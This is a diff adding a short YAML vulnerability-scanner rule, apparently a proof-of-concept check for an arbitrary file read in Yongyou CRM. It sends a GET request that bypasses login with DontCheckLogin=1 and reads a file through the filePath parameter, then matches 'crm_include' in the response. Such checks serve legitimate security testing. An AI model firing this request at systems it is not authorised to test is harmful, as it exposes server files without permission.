@@ -1,0 +1,10 @@
+name: yongyou_crm_file_read
+rules:
+  - method: GET
+    path: "/ajax/getemaildata.php?DontCheckLogin=1&filePath=./getemaildata.php"
+    expression: |
+      response.body.bcontains(bytes("crm_include"))
+detail:
+  author: 0d9y
+  links:
+    - https://www.seebug.org/vuldb/ssvid-90525
